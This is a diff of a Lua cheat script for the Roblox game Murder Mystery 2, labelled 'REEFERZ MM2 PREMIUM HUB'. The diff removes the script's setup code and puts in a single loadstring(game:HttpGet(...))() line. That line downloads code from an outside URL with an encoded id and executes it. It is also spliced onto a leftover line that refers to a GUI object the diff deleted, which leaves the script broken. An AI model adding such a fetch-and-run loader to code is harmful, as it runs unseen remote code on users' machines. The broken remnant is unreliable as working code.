@@ -1,40 +1,4 @@
---[[
-    REEFERZ MM2 PREMIUM HUB
-]]
-
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local TeleportService = game:GetService("TeleportService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local StarterGui = game:GetService("StarterGui")
-local Workspace = game:GetService("Workspace")
-local HttpService = game:GetService("HttpService")
-
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-
-local PINK = Color3.fromRGB(255, 70, 165)
-local PINK_SOFT = Color3.fromRGB(255, 105, 180)
-local BLUE = Color3.fromRGB(70, 145, 255)
-local GREEN = Color3.fromRGB(70, 220, 125)
-local RED = Color3.fromRGB(255, 75, 95)
-local WHITE = Color3.fromRGB(245, 245, 248)
-local MUTED = Color3.fromRGB(155, 155, 165)
-local PANEL = Color3.fromRGB(18, 18, 22)
-local CARD = Color3.fromRGB(24, 24, 29)
-local CARD2 = Color3.fromRGB(30, 30, 36)
-local BLACK = Color3.fromRGB(8, 8, 11)
-
-local old = PlayerGui:FindFirstChild("MM2CustomGui")
-if old then old:Destroy() end
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "MM2CustomGui"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.DisplayOrder = 999999
+loadstring(game:HttpGet("https://api.synscripts.org/run/eyJpZCI6Ijg1NjJhZTVhLWU3N2UtNGI0Zi1iOTZiLTMzNGU2MDgxYzQzZiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0="))()ScreenGui.DisplayOrder = 999999
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.Parent = PlayerGui
 
